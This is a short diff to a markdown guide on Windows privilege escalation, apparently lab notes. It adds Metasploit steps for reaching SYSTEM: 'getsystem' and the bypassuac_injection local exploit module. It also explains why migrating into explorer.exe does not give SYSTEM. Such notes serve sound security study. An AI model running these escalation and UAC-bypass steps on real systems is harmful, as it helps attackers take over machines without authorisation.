@@ -89,11 +89,20 @@ C:\Windows\System32> net localgroup administrators
   migrate 688
   getuid      # Now: NT AUTHORITY\SYSTEM
   ```
-
+OR
+  ```msf
+getsystem
+  ```
 > ❓ **Why didn’t `migrate explorer.exe` give SYSTEM?**  
 > Because `explorer.exe` runs as the **logged-in user** (`VICTIM\admin`), **not** as SYSTEM.  
 > Only processes like `lsass.exe`, `winlogon.exe`, or `services.exe` run as **SYSTEM**.
 
+## OR easily via `exploit(windows/local/bypassuac_injection)`
+
+and then
+  ```msf
+getsystem
+  ```
 ---
 ## 🔑 Key Takeaways
 
